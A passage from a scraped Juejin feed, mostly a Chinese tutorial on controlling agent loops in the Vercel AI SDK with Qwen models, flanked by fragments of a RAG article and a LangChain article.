<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aff8d6b1c8c4407abb79acad3490bd1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5qKm6YeM5a-756CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771521624&amp;x-signature=Sa0V1gRYoKtcgod3fg2eZTTyP2M%3D" alt="微信图片_20260212194801_50_236.png" loading="lazy"/></p>
<h2 data-id="heading-6">总结</h2>
<p>SmartChat 的 RAG 架构虽然不复杂，但每个环节都做了务实的工程选择：本地嵌入降低成本、pgvector 简化架构、CJK 分块保证中文质量、批量写入保证稳定性。这套方案特别适合中小团队快速落地 AI 客服场景。</p>
<blockquote>
<p>🔗 <strong>项目地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fsmartchat.nofx.asia%2F" target="_blank" title="https://smartchat.nofx.asia/" ref="nofollow noopener noreferrer">smartchat.nofx.asia/</a></strong>，MIT 开源协议，欢迎 Star 和贡献。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[🚀 Vercel AI SDK 使用指南： 循环控制 (Loop Control)]]></title>    <link>https://juejin.cn/post/7605769126271549486</link>    <guid>https://juejin.cn/post/7605769126271549486</guid>    <pubDate>2026-02-13T00:24:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605769126271549486" data-draft-id="7605817795627974706" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="🚀  Vercel AI SDK 使用指南： 循环控制 (Loop Control) "/> <meta itemprop="keywords" content="Agent,后端"/> <meta itemprop="datePublished" content="2026-02-13T00:24:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ZaneAI"/> <meta itemprop="url" content="https://juejin.cn/user/186266444380203"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            🚀  Vercel AI SDK 使用指南： 循环控制 (Loop Control) 
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/186266444380203/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ZaneAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T00:24:52.000Z" title="Fri Feb 13 2026 00:24:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    3
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在开发复杂的 AI Agent 时，Agent 通常需要经过“思考 -&gt; 调用工具 -&gt; 观察结果 -&gt; 再思考”的多次循环才能完成任务。如何优雅地控制这个循环（例如何时停止、每一步如何动态调整参数）是构建健壮 Agent 的关键。</p>
<p>本文将基于 Vercel AI SDK 的最新特性，带你深入玩转 Agent 的<strong>循环控制 (Loop Control)</strong> 。为了贴合国内开发者的实际场景，本文的所有样例代码均采用<strong>阿里通义千问最新模型 (<code>qwen-max</code>)</strong> 进行演示！</p>
<h2 data-id="heading-0">🛠 环境与模型准备</h2>
<p>通义千问提供了全面兼容 OpenAI 的 API 端点，因此在 Vercel AI SDK 中，我们可以直接使用 <code>@ai-sdk/openai</code> 来无缝接入：</p>
<p>Bash</p>
<pre><code class="hljs language-bash" lang="bash">npm install ai @ai-sdk/openai zod
</code></pre>
<p>在代码中初始化 Qwen 模型实例：</p>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { createOpenAI } <span class="hljs-keyword">from</span> <span class="hljs-string">'@ai-sdk/openai'</span>;

<span class="hljs-comment">// 配置阿里百炼 (DashScope) 的兼容端点</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">qwen</span> = <span class="hljs-title function_ invoke__">createOpenAI</span>({
  <span class="hljs-attr">baseURL</span>: <span class="hljs-string">'https://dashscope.aliyuncs.com/compatible-mode/v1'</span>,
  <span class="hljs-attr">apiKey</span>: process.env.DASHSCOPE_API_KEY, 
});

<span class="hljs-comment">// 在后续的示例中，我们将统一使用 qwen('qwen-max')</span>
</code></pre>
<hr/>
<h2 data-id="heading-1">一、 核心概念：什么是 Loop Control？</h2>
<p>在使用 <code>ToolLoopAgent</code> 编排 Agent 时，循环会持续进行，直到满足以下任一条件才会停止：</p>
<ol>
<li>模型返回了除 <code>tool-calls</code>（工具调用）之外的完成原因。</li>
<li>调用的工具<strong>没有</strong>配备 <code>execute</code>（执行）函数。</li>
<li>工具调用触发了需要人工审批的拦截。</li>
<li><strong>满足了开发者定义的停止条件 (Stop Condition)</strong> 。</li>
</ol>
<p>Vercel AI SDK 提供了两个极其强大的参数来控制这个内部循环：</p>
<ul>
<li><strong><code>stopWhen</code></strong>: 决定何时终止执行。</li>
<li><strong><code>prepareStep</code></strong>: 在每一步执行<strong>前</strong>，动态修改运行设置（如切换模型、控制工具白名单、精简上下文等）。</li>
</ul>
<hr/>
<h2 data-id="heading-2">二、 停止条件 (Stop Conditions)</h2>
<p><code>stopWhen</code> 参数控制 Agent 在拿到工具执行结果后是否继续下一步。默认情况下，Agent 最多执行 20 步（即内置的 <code>stepCountIs(20)</code>）。</p>
<h3 data-id="heading-3">1. 组合内置条件</h3>
<p>AI SDK 提供了现成的停止条件，你可以将它们组合在数组中，<strong>满足其一即停止</strong>：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, stepCountIs, hasToolCall } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
<span class="hljs-comment">// 引入上面配置的 qwen</span>
<span class="hljs-comment">// import { qwen } from './qwen-setup'; </span>

<span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  <span class="hljs-attr">tools</span>: {
    <span class="hljs-comment">// 你的工具集，例如 search 等</span>
  },
  <span class="hljs-attr">stopWhen</span>: [
    <span class="hljs-title function_">stepCountIs</span>(<span class="hljs-number">20</span>),          <span class="hljs-comment">// 兜底策略：最多执行 20 步，防止死循环</span>
    <span class="hljs-title function_">hasToolCall</span>(<span class="hljs-string">'someTool'</span>),  <span class="hljs-comment">// 业务逻辑：一旦调用了 'someTool' 工具就立刻停止</span>
  ],
});

<span class="hljs-keyword">const</span> result = <span class="hljs-keyword">await</span> agent.<span class="hljs-title function_">generate</span>({
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">'请调研并分析 2026 年前端开发趋势'</span>,
});
</code></pre>
<h3 data-id="heading-4">2. 编写自定义条件 (Custom Conditions)</h3>
<p>面对复杂的业务场景，你可以获取到历史所有步骤 <code>steps</code>，编写自定义的停止逻辑。例如，根据消耗的 Token 成本来“熔断” Agent：</p>
<p>TypeScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { <span class="hljs-title class_">ToolLoopAgent</span>, <span class="hljs-title class_">StopCondition</span>, <span class="hljs-title class_">ToolSet</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;

<span class="hljs-keyword">const</span> tools = { <span class="hljs-comment">/* ... */</span> } satisfies <span class="hljs-title class_">ToolSet</span>;

<span class="hljs-comment">// 自定义条件：当 Token 估算成本超过 $0.50 时强制停止</span>
<span class="hljs-keyword">const</span> <span class="hljs-attr">budgetExceeded</span>: <span class="hljs-title class_">StopCondition</span>&lt;<span class="hljs-keyword">typeof</span> tools&gt; = <span class="hljs-function">(<span class="hljs-params">{ steps }</span>) =&gt;</span> {
  <span class="hljs-keyword">const</span> totalUsage = steps.<span class="hljs-title function_">reduce</span>(
    <span class="hljs-function">(<span class="hljs-params">acc, step</span>) =&gt;</span> ({
      <span class="hljs-attr">inputTokens</span>: acc.<span class="hljs-property">inputTokens</span> + (step.<span class="hljs-property">usage</span>?.<span class="hljs-property">inputTokens</span> ?? <span class="hljs-number">0</span>),
      <span class="hljs-attr">outputTokens</span>: acc.<span class="hljs-property">outputTokens</span> + (step.<span class="hljs-property">usage</span>?.<span class="hljs-property">outputTokens</span> ?? <span class="hljs-number">0</span>),
    }),
    { <span class="hljs-attr">inputTokens</span>: <span class="hljs-number">0</span>, <span class="hljs-attr">outputTokens</span>: <span class="hljs-number">0</span> },
  );
  
  <span class="hljs-comment">// 按照自定义汇率或 token 价格估算</span>
  <span class="hljs-keyword">const</span> costEstimate = (totalUsage.<span class="hljs-property">inputTokens</span> * <span class="hljs-number">0.01</span> + totalUsage.<span class="hljs-property">outputTokens</span> * <span class="hljs-number">0.03</span>) / <span class="hljs-number">1000</span>;
  <span class="hljs-keyword">return</span> costEstimate &gt; <span class="hljs-number">0.5</span>; 
};

<span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  <span class="hljs-attr">model</span>: <span class="hljs-title function_">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  tools,
  <span class="hljs-attr">stopWhen</span>: budgetExceeded, 
});
</code></pre>
<hr/>
<h2 data-id="heading-5">三、 动态准备步骤 (Prepare Step) 神器</h2>
<p><code>prepareStep</code> 回调会在循环的<strong>每一步正式发起大模型请求之前</strong>运行。利用它，你可以实现高度智能的动态行为。</p>
<h3 data-id="heading-6">1. 动态模型切换 (Dynamic Model Selection)</h3>
<p>前几步简单的资料检索我们可以用轻量级模型省钱提速，后面复杂的逻辑推理再无缝切换到 <code>qwen-max</code>：</p>
<p>TypeScript</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">const</span> agent = <span class="hljs-keyword">new</span> ToolLoopAgent({
  model: qwen(<span class="hljs-string">'qwen-turbo'</span>), <span class="hljs-comment">// 初始默认使用较快/较便宜的模型</span>
  tools: { <span class="hljs-comment">/* ... */</span> },
  prepareStep: <span class="hljs-keyword">async</span> ({ stepNumber, messages }) =&gt; {
    <span class="hljs-comment">// 如果循环超过 2 步，且上下文消息变长，说明任务变得复杂</span>
    <span class="hljs-comment">// 动态返回新的配置，无缝切换到最强的 qwen-max 模型</span>
    <span class="hljs-keyword">if</span> (stepNumber &gt; <span class="hljs-number">2</span> &amp;&amp; messages.length &gt; <span class="hljs-number">10</span>) {
      <span class="hljs-keyword">return</span> {
        model: qwen(<span class="hljs-string">'qwen-max'</span>),
      };
    }
    <span class="hljs-comment">// 返回空对象则继续使用当前配置</span>
    <span class="hljs-keyword">return</span> {};
  },
});
</code></pre>
<h3 data-id="heading-7">2. 阶段性工具分配 (Tool Selection)</h3>
<p>在复杂 SOP（标准作业程序）中，我们可以控制 Agent 在不同阶段能使用的工具：</p>
<p>TypeScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  prepareStep: async ({ stepNumber }) =&gt; {
    <span class="hljs-comment">// 第一阶段：检索资料 (第 0-2 步)</span>
    <span class="hljs-keyword">if</span> (stepNumber &lt;= <span class="hljs-number">2</span>) {
      <span class="hljs-keyword">return</span> {
        activeTools: [<span class="hljs-string">'search'</span>],    <span class="hljs-comment">// 只开放搜索工具</span>
        toolChoice: <span class="hljs-string">'required'</span>,     <span class="hljs-comment">// 强制要求大模型必须调用工具</span>
      };
    }
    
    <span class="hljs-comment">// 第二阶段：数据分析 (第 3-5 步)</span>
    <span class="hljs-keyword">if</span> (stepNumber &lt;= <span class="hljs-number">5</span>) {
      <span class="hljs-keyword">return</span> { activeTools: [<span class="hljs-string">'analyze'</span>] };
    }
    
    <span class="hljs-comment">// 第三阶段：总结汇报 (第 6 步以上)</span>
    <span class="hljs-keyword">return</span> {
      activeTools: [<span class="hljs-string">'summarize'</span>],
      toolChoice: { type: <span class="hljs-string">'tool'</span>, toolName: <span class="hljs-string">'summarize'</span> }, <span class="hljs-comment">// 强制大模型调用特定的总结工具</span>
    };
  }
</code></pre>
<h3 data-id="heading-8">3. 防止上下文撑爆 (Context Management)</h3>
<p>长时间运行的 Agent 容易超出模型支持的最大 Token 长度。我们可以在这里动态裁剪传递给大模型的消息：</p>
<p>TypeScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  prepareStep: async ({ messages }) =&gt; {
    <span class="hljs-comment">// 如果对话超过 20 条，进行滑动窗口裁剪</span>
    <span class="hljs-keyword">if</span> (messages.length &gt; <span class="hljs-number">20</span>) {
      <span class="hljs-keyword">return</span> {
        messages: [
          messages[<span class="hljs-number">0</span>], <span class="hljs-comment">// 永远保留第一条 System Prompt/User Instruction</span>
          ...messages.slice(-<span class="hljs-number">10</span>), <span class="hljs-comment">// 只保留最近的 10 条交互记录</span>
        ],
      };
    }
    <span class="hljs-keyword">return</span> {};
  }
</code></pre>
<hr/>
<h2 data-id="heading-9">四、 强制工具调用 (Forced Tool Calling) 模式</h2>
<p>很多时候，我们不希望 Agent 用自然语言“水字数”，而是<strong>必须</strong>通过工具输出标准化的 JSON 结构结果。</p>
<p><strong>解法：</strong> 结合 <code>toolChoice: 'required'</code>，并设计一个<strong>不包含</strong> <code>execute</code> 函数的 <code>done</code> 虚拟工具。</p>
<blockquote>
<p>💡 <strong>原理：</strong> 因为模型被强制要求调用工具，而当它调用了没有执行函数的 <code>done</code> 工具时，AI SDK 内部因为无代码可执行，会触发“循环中断”条件，从而完美终止 Agent，并将结构化参数原封不动地返回给你！</p>
</blockquote>
<p>TypeScript</p>
<pre><code class="hljs language-php" lang="php">import { ToolLoopAgent, tool } <span class="hljs-keyword">from</span> <span class="hljs-string">'ai'</span>;
import { z } <span class="hljs-keyword">from</span> <span class="hljs-string">'zod'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">agent</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToolLoopAgent</span>({
  model: <span class="hljs-title function_ invoke__">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
  tools: {
    search: searchTool,
    analyze: analyzeTool,
    done: <span class="hljs-title function_ invoke__">tool</span>({
      <span class="hljs-attr">description</span>: <span class="hljs-string">'当你完成所有工作后，调用此工具输出最终结果'</span>,
      <span class="hljs-attr">inputSchema</span>: z.<span class="hljs-keyword">object</span>({
        <span class="hljs-attr">answer</span>: z.<span class="hljs-keyword">string</span>().<span class="hljs-title function_ invoke__">describe</span>(<span class="hljs-string">'最终的分析报告'</span>),
        confidence: z.<span class="hljs-title function_ invoke__">number</span>().<span class="hljs-title function_ invoke__">describe</span>(<span class="hljs-string">'可信度评分 0-1'</span>),
      }),
      <span class="hljs-comment">// 注意核心技巧：这里绝对不写 execute 函数！</span>
    }),
  },
  toolChoice: <span class="hljs-string">'required'</span>, <span class="hljs-comment">// 强制每一步都不能输出废话，必须用工具</span>
});

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">result</span> = await agent.<span class="hljs-title function_ invoke__">generate</span>({
  <span class="hljs-attr">prompt</span>: <span class="hljs-string">'请综合分析这份数据，并在完成后使用 done 工具提交最终报告。'</span>,
});

<span class="hljs-comment">// 从 staticToolCalls (未被执行的工具调用列表) 中提取出最终答案</span>
<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">finalToolCall</span> = result.staticToolCalls[<span class="hljs-number">0</span>]; 
<span class="hljs-keyword">if</span> (finalToolCall?.toolName === <span class="hljs-string">'done'</span>) {
  console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">"最终报告:"</span>, finalToolCall.input.answer);
  console.<span class="hljs-title function_ invoke__">log</span>(<span class="hljs-string">"可信度:"</span>, finalToolCall.input.confidence);
}
</code></pre>
<hr/>
<h2 data-id="heading-10">五、 手动循环控制 (Manual Loop Control)</h2>
<p>如果你发现 <code>ToolLoopAgent</code> 的声明式 API 依然无法满足极为复杂的定制需求，你可以退回到 AI SDK 的底层，使用 <code>generateText</code> 手动写一个 <code>while</code> 循环。这为你提供了 100% 的底层控制流掌控力：</p>
<p>TypeScript</p>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-keyword">import</span> { generateText, ModelMessage } from <span class="hljs-string">'ai'</span>;

<span class="hljs-type">const</span> messages: ModelMessage[] = [{ role: <span class="hljs-string">'user'</span>, content: <span class="hljs-string">'分析并解决这个系统 Bug...'</span> }];
let step = <span class="hljs-number">0</span>;
<span class="hljs-type">const</span> maxSteps = <span class="hljs-number">10</span>;

<span class="hljs-keyword">while</span> (step &lt; maxSteps) {
  <span class="hljs-type">const</span> result = await <span class="hljs-built_in">generateText</span>({
    model: <span class="hljs-built_in">qwen</span>(<span class="hljs-string">'qwen-max'</span>),
    messages,
    tools: {
      <span class="hljs-comment">// 在这里挂载你的工具</span>
    },
  });

  <span class="hljs-comment">// 将当前这一步的交互结果（包含 assistant 回复、工具调用结果等）追加到上下文池</span>
  messages.<span class="hljs-built_in">push</span>(...result.response.messages);

  <span class="hljs-comment">// 如果模型直接生成了最终结论文本（并没有继续调用工具），则认为整个思考链条已闭环</span>
  <span class="hljs-keyword">if</span> (result.text) {
    <span class="hljs-keyword">break</span>; 
  }

  step++;
}

console.<span class="hljs-built_in">log</span>(<span class="hljs-string">"任务完成，最终输出:"</span>, messages[messages.length - <span class="hljs-number">1</span>].content);
</code></pre>
<hr/>
<h2 data-id="heading-11">结语</h2>
<p>Vercel AI SDK 的 Loop Control 为构建复杂的 Agent 赋予了极大的灵活性和工程化能力：</p>
<ol>
<li><strong><code>stopWhen</code></strong> 让你可以精准定义退出条件，避免死循环和天价 API 账单。</li>
<li><strong><code>prepareStep</code></strong> 是实现 Agent “动态进化”的关键，可按需切换模型配置和分配工具白名单。</li>
<li>创新的<strong>虚拟 <code>done</code> 工具模式</strong>，是确保业务系统获得结构化数据的绝佳实践。</li>
</ol>
<p>搭配国内顶尖的<strong>通义千问 <code>qwen-max</code></strong> 模型强大的指令遵循能力，无论在落地效果还是接口兼容性上，都能为开发者提供丝滑的体验！</p>
<p>如果在开发 Agent 的路上对本文有所启发，欢迎<strong>点赞、收藏</strong>并在评论区交流你的最佳实践！👇</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[[拆解LangChain执行引擎] PregelProtocol——定义了"LangChain执行体"最小功能集]]></title>    <link>https://juejin.cn/post/7605552034570879022</link>    <guid>https://juejin.cn/post/7605552034570879022</guid>    <pubDate>2026-02-12T23:40:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605552034570879022" data-draft-id="7605811866908082185" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" [拆解LangChain执行引擎] PregelProtocol——定义了&quot;LangChain执行体&quot;最小功能集"/> <meta itemprop="keywords" content="LangChain,Python"/> <meta itemprop="datePublished" content="2026-02-12T23:40:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="JaydenAI"/> <meta itemprop="url" content="https://juejin.cn/user/3001011641261209"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             [拆解LangChain执行引擎] PregelProtocol——定义了"LangChain执行体"最小功能集
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3001011641261209/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    JaydenAI
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T23:40:18.000Z" title="Thu Feb 12 2026 23:40:18 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body 